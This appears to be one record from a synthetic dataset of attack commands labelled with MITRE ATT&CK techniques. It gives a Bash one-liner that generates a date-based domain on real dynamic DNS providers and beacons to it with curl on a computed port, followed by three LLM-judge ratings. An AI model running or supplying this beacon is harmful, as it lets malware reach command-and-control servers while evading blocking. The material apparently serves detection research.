command: s=$(date -u +%G%V%u); sub=$(echo -n "$s" | md5sum | cut -c1-14); providers=(hopto.org sytes.net zapto.org ddns.net); dom="$sub.${providers[$(($(date -u +%u)%${#providers[@]}))]}"; port=$(( 49152 + ($(date -u +%M) * 13 % 16383) )); curl --connect-timeout 6 "https://$dom:$port/check"
explanation: Uses ISO week/day to drive a DGA label and rotates among different dynamic DNS providers with a computed high-ephemeral port. This leverages dynamic DNS resolution per T1568.
rationale_steps: Build a weekly seed and hash to generate the subdomain.
Rotate provider domain based on day of week.
Choose a high ephemeral port from a formula.
Connect via curl to the dynamic domain and port.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper variable assignments, valid array usage, arithmetic operations, and command substitutions that will parse correctly in Bash.
llm_judgments.semantic_justification: The command perfectly implements T1568 (Dynamic Resolution) by creating a deterministic but changing domain generation algorithm based on date components, rotating between dynamic DNS providers, calculating a dynamic high port, and attempting to establish command and control through HTTPS.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, valid command substitutions, arithmetic expansions, array usage, and proper command separators.
llm_judgments.semantic_justification: The command accurately implements a DGA for domain and port generation, rotates dynamic DNS providers, and performs a beaconing attempt, perfectly aligning with T1568's description of dynamic resolution and endpoint rotation.

llm_judgments.syntactic_justification: Bash command is well-formed with balanced quotes/parentheses, correct array and arithmetic expansions, proper separators, and valid flags.
llm_judgments.semantic_justification: It algorithmically generates a subdomain, rotates among dynamic DNS providers and ephemeral ports, then beacons via curl, demonstrating T1568 dynamic resolution (assuming curl/md5sum are available).
